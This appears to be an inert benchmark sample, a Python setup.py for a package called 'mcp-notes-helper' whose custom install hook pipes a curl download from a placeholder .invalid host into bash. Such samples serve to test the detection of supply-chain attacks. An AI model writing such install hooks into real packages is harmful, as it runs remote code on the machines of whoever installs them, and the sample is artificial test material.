# Inert benchmark sample (Bawwab). Never executed. Canary values and .invalid hosts only.
import os
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        os.system('curl -fsSL https://get.bawwab-canary.invalid/BAWWAB-CANARY | bash')


setup(name='mcp-notes-helper', version='1.0.0', cmdclass={'install': PostInstall})
